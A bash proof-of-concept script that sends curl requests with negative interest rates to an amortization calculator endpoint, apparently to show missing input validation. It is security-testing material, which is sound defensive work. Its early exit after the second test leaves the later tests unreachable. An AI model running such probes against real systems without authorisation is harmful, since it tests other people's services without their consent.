#!/bin/bash

# POC: Negative Interest Rate Accepted in Amortization Calculator
# This script demonstrates a business logic flaw where the amortization
# calculator accepts negative interest rates without validation

TARGET_URL="${1:-http://localhost}"
ENDPOINT="/amortization"

echo "=========================================="
echo "Testing Negative Interest Rate Acceptance"
echo "=========================================="
echo ""

# Test 1: Valid parameters (baseline)
echo "[*] Test 1: Valid parameters (baseline)"
echo "    Request: ${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=5"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=5")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "    HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    # Count rows in response to verify it processed
    ROWS=$(echo "$BODY" | grep -c "Month\|month" || echo "0")
    echo "    Result: ACCEPTED (Status 200)"
    echo "    Response contains amortization data: $(echo "$BODY" | head -c 100)..."
else
    echo "    Result: REJECTED (Status $HTTP_CODE)"
fi
echo ""

# Test 2: Negative interest rate (-10%)
echo "[*] Test 2: Negative interest rate (-10%)"
echo "    Request: ${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=-10"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=-10")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "    HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "    *** VULNERABILITY FOUND ***"
    echo "    Negative interest rate was ACCEPTED without validation"
    echo "    Response: $(echo "$BODY" | head -c 150)..."
    exit 0  # Success - vulnerability confirmed
else
    echo "    Negative rate properly rejected (Status $HTTP_CODE)"
    exit 1
fi
echo ""

# Test 3: Negative interest rate (-50%)
echo "[*] Test 3: Negative interest rate (-50%)"
echo "    Request: ${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=-50"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=-50")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "    HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "    *** VULNERABILITY CONFIRMED ***"
    echo "    Negative interest rate (-50%) was ACCEPTED"
    echo "    Response: $(echo "$BODY" | head -c 150)..."
else
    echo "    Status: $HTTP_CODE"
fi
echo ""

# Test 4: Compare behavior - valid vs negative
echo "[*] Test 4: Behavior comparison"
echo "    Valid rate (5%):"
VALID=$(curl -s "${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=5" | head -c 100)
echo "      $VALID..."
echo "    Negative rate (-10%):"
NEGATIVE=$(curl -s "${TARGET_URL}${ENDPOINT}?term=5&principal=100000&rate=-10" | head -c 100)
echo "      $NEGATIVE..."
if [ "$VALID" != "$NEGATIVE" ]; then
    echo "    Responses differ - negative rate produces different calculations"
else
    echo "    Responses are identical"
fi
echo ""

echo "=========================================="
echo "POC Complete: Negative interest rate vulnerability demonstrated"
echo "=========================================="